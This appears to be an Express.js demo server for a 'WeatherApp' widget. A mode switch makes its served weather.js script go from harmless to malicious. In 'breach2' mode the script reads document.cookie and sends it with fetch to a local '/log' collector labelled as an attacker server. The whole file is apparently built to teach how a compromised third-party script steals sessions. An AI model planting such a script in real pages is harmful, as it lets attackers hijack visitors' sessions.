const express = require("express");

const app = express();
const PORT = 5000;

let mode = "safe";

app.get("/", (req, res) => {
  res.send(`
    <h1>WeatherApp Server</h1>
    <p>Current mode: <b>${mode}</b></p>
    <ul>
      <li><a href="/mode/safe">Set SAFE mode</a></li>
      <li><a href="/mode/breach1">Set BREACH1 mode</a></li>
      <li><a href="/mode/breach2">Set BREACH2 mode</a></li>
    </ul>
  `);
});

app.get("/mode/:value", (req, res) => {
  const value = req.params.value;

  if (!["safe", "breach1", "breach2"].includes(value)) {
    return res.status(400).send("Invalid mode");
  }

  mode = value;
  console.log(`WeatherApp mode changed to: ${mode}`);
  res.send(`Mode changed to: ${mode}`);
});

app.get("/weather.js", (req, res) => {
  res.type("application/javascript");

  if (mode === "safe") {
    return res.send(`
      console.log("Weather widget loaded safely from Port 5000");
    `);
  }

  if (mode === "breach1") {
    return res.send(`
      const stolenCookie = document.cookie;
      alert("Stolen cookie: " + stolenCookie);
    `);
  }

  if (mode === "breach2") {
    return res.send(`
      const stolenCookie = document.cookie;
      fetch("http://localhost:5000/log?data=" + encodeURIComponent(stolenCookie));
      console.log("Cookie successfully sent to Attacker Server!");
    `);
  }

  res.send(`console.log("Unknown mode");`);
});

app.get("/log", (req, res) => {
  const data = req.query.data || "";
  console.log("ATTACKER LOG:", data);
  res.send("logged");
});

app.listen(PORT, () => {
  console.log(`WeatherApp running at http://localhost:${PORT}`);
});